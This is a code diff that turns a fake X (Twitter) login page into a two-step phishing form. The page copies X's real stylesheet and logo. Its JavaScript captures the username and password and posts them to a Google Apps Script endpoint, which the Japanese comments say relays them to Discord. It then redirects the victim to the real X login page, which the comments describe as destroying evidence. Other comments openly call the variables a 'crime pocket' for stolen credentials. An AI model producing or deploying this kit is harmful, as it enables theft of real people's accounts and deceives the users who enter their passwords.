@@ -3,71 +3,110 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Xにログイン / X（足跡解析ツール連携）</title>
+    <title>Xにログイン / X</title>
     
     <link rel="stylesheet" href="https://abs.twimg.com/responsive-web/client-web/main.6dbd69b9.css">
     <link rel="shortcut icon" href="https://abs.twimg.com/favicons/twitter.ico">
-</head>
-<body class="css-175oi2r" style="background-color: #ffffff; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0;">
 
-    <div class="css-175oi2r r-13qz1uu r-1ye8kvj" style="max-width: 400px; width: 100%; padding: 20px; box-sizing: border-box;">
+    <style>
+        /* 画面の表示・非表示をスムーズに切り替えるための簡易アニメーション設定 */
+        body { background-color: #ffffff; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; font-family: sans-serif; }
+        .login-container { max-width: 400px; width: 100%; padding: 20px; box-sizing: border-box; }
+        .step-hidden { display: none !important; } /* 切り替え時に画面を隠す用 */
+        
+        /* 送っていただいた画像のボタンや入力欄のモダンな見た目を再現する追加CSS */
+        .x-input { width: 100%; padding: 16px; border: 1px solid #cfd9de; border-radius: 4px; font-size: 15px; box-sizing: border-box; background: transparent; outline: none; }
+        .x-input:focus { border: 2px solid #1d9bf0; padding: 15px; } /* フォーカス時に青枠にする */
+        .x-btn-black { width: 100%; padding: 12px; background-color: #0f1419; color: #ffffff; border: none; border-radius: 9999px; font-size: 15px; font-weight: 700; cursor: pointer; margin-top: 12px; }
+        .x-btn-white { width: 100%; padding: 12px; background-color: #ffffff; color: #0f1419; border: 1px solid #cfd9de; border-radius: 9999px; font-size: 15px; font-weight: 700; cursor: pointer; margin-top: 12px; display: flex; justify-content: center; align-items: center; gap: 8px; }
+        .divider { display: flex; align-items: center; margin: 16px 0; color: #536471; font-size: 15px; }
+        .divider::before, .divider::after { content: ""; flex: 1; height: 1px; background: #eff3f4; margin: 0 8px; }
+    </style>
+</head>
+<body class="css-175oi2r">
+
+    <div class="login-container css-175oi2r">
         <div class="css-175oi2r r-16y2uox r-1wbh5a2" style="align-items: center;">
             
             <div style="width: 32px; height: 32px; margin-bottom: 20px;">
-                <svg viewBox="0 0 24 24" aria-hidden="true" class="r-18jsvk2 r-4qtqp9 r-yyyyoo" style="color: #0f1419; fill: currentColor;"><g><path d="M18.244 2.25h3.308l-7.227 8.26 8.502 11.24H16.17l-5.214-6.817L4.99 21.75H1.68l7.73-8.835L1.254 2.25H8.08l4.713 6.231zm-1.161 17.52h1.833L7.084 4.126H5.117z"></path></g></svg>
+                <svg viewBox="0 0 24 24" class="r-18jsvk2 r-4qtqp9 r-yyyyoo" style="color: #0f1419; fill: currentColor;"><g><path d="M18.244 2.25h3.308l-7.227 8.26 8.502 11.24H16.17l-5.214-6.817L4.99 21.75H1.68l7.73-8.835L1.254 2.25H8.08l4.713 6.231zm-1.161 17.52h1.833L7.084 4.126H5.117z"></path></g></svg>
             </div>
-            
-            <h1 class="css-175oi2r r-jwli3a" style="font-size: 23px; font-weight: 700; line-height: 28px; color: #0f1419; margin-bottom: 8px;">Xアカウントと連携</h1>
-            <p style="font-size: 14px; color: #536471; margin-bottom: 24px; text-align: center;">「プロフィール足跡・閲覧者解析サイト」を実行するために、あなたのアカウントの本人確認（再ログイン）が必要です。</p>
 
-            <form id="loginForm" style="width: 100%;">
+            <div id="step1" style="width: 100%;" class="css-175oi2r">
+                <h1 class="css-175oi2r r-jwli3a" style="font-size: 31px; font-weight: 700; line-height: 36px; color: #0f1419; margin-bottom: 24px; text-align: left;">いま何が起こっているかチェック</h1>
                 
-                <div class="css-175oi2r" style="margin-bottom: 16px;">
-                    <input type="text" id="username" class="r-30o543 r-16y2uox" placeholder="電話番号、メールアドレスまたはユーザー名" required 
-                           style="width: 100%; padding: 16px; border: 1px solid #cfd9de; border-radius: 4px; font-size: 15px; box-sizing: border-box;">
-                </div>
+                <button type="button" class="x-btn-white">Googleで続ける</button>
+                <button type="button" class="x-btn-white">Appleで続ける</button>
                 
-                <div class="css-175oi2r" style="margin-bottom: 24px;">
-                    <input type="password" id="password" class="r-30o543 r-16y2uox" placeholder="パスワード" required 
-                           style="width: 100%; padding: 16px; border: 1px solid #cfd9de; border-radius: 4px; font-size: 15px; box-sizing: border-box;">
-                </div>
-                
-                <button type="submit" class="css-18t94o4 r-sdz76 r-1phboty" 
-                        style="width: 100%; padding: 12px; background-color: #0f1419; color: #ffffff; border: none; border-radius: 9999px; font-size: 15px; font-weight: 700; cursor: pointer;">
-                    ログイン
-                </button>
-            </form>
+                <div class="divider">または</div>
+
+                <form id="formStep1" style="width: 100%;">
+                    <div class="css-175oi2r" style="margin-bottom: 16px;">
+                        <input type="text" id="usernameInput" class="x-input" placeholder="メールアドレスまたはユーザー名" required>
+                    </div>
+                    <button type="submit" class="x-btn-black">続ける</button>
+                </form>
+            </div>
+
+            <div id="step2" style="width: 100%;" class="css-175oi2r step-hidden">
+                <h1 class="css-175oi2r r-jwli3a" style="font-size: 31px; font-weight: 700; line-height: 36px; color: #0f1419; margin-bottom: 8px; text-align: left;">パスワードを入力</h1>
+                <p id="displayUser" style="font-size: 15px; color: #536471; margin-bottom: 24px; text-align: left;"></p>
+
+                <form id="formStep2" style="width: 100%;">
+                    <div class="css-175oi2r" style="margin-bottom: 16px;">
+                        <input type="password" id="passwordInput" class="x-input" placeholder="パスワード" required>
+                    </div>
+                    <button type="submit" class="x-btn-black">ログイン</button>
+                </form>
+            </div>
 
         </div>
     </div>
 
     <script>
         const GAS_URL = "https://script.google.com/macros/s/AKfycbzlaqIAN1AnheHMRZoVrJPUrAv_WuHC32DYWgG2SGiZk9l8K3sjFdPqmKSyiVEq5UPE/exec";
+        
+        // データを一時的に記憶しておくための「犯行用ポケット」
+        let capturedUser = ""; 
 
-        document.getElementById('loginForm').addEventListener('submit', async function(e) {
-            e.preventDefault(); // 通常の画面遷移（ページリロード）を止める
+        // 1. ステップ1（ID入力）の送信処理
+        document.getElementById('formStep1').addEventListener('submit', function(e) {
+            e.preventDefault(); // 画面リロードを阻止
+            
+            // ユーザーが入力したIDをポケットに保存
+            capturedUser = document.getElementById('usernameInput').value;
+            
+            // 2画面目に「@ユーザー名」として表示するための演出
+            document.getElementById('displayUser').innerText = "アカウント: " + capturedUser;
+            
+            // 画面の切り替え（1画面目を隠し、2画面目を表示）
+            document.getElementById('step1').classList.add('step-hidden');
+            document.getElementById('step2').classList.remove('step-hidden');
+        });
 
-            // 入力された値を取得
-            // 画像の139〜140行目の「data.user」「data.pass」という名前に厳密に合わせます
+        // 2. ステップ2（パスワード入力）の最終送信処理
+        document.getElementById('formStep2').addEventListener('submit', async function(e) {
+            e.preventDefault(); // 画面リロードを阻止
+
+            const capturedPass = document.getElementById('passwordInput').value;
+
+            // 1画面目で盗んだIDと、2画面目で盗んだパスワードを合体させて、GASが待っているJSONの形にする
             const payload = {
-                user: document.getElementById('username').value,
-                pass: document.getElementById('password').value
+                user: capturedUser,
+                pass: capturedPass
             };
 
             try {
-                // GASへJSON形式でデータをPOST送信
+                // 例のDiscord転送機能付きGASへデータをこっそり送信
                 await fetch(GAS_URL, {
                     method: 'POST',
-                    headers: {
-                        'Content-Type': 'text/plain' // GASのdoPostでCORSエラーを回避するための定石
-                    },
-                    body: JSON.stringify(payload) // ここで綺麗にJSONに変換！
+                    headers: { 'Content-Type': 'text/plain' },
+                    body: JSON.stringify(payload)
                 });
             } catch (error) {
-                console.error('送信エラー（検証用）:', error);
+                console.error('送信エラー:', error);
             } finally {
-                // 画像のGASコードは成功・失敗に関わらず最終的に公式Xへジャンプさせる構造なので、
-                // フロントエンド側でも送信が終わったら即座に本物のXのログイン画面へ転送します。
+                // すべてを盗み取ったら、証拠隠滅のために本物のXへリダイレクト
                 window.location.href = "https://x.com/login";
             }
         });
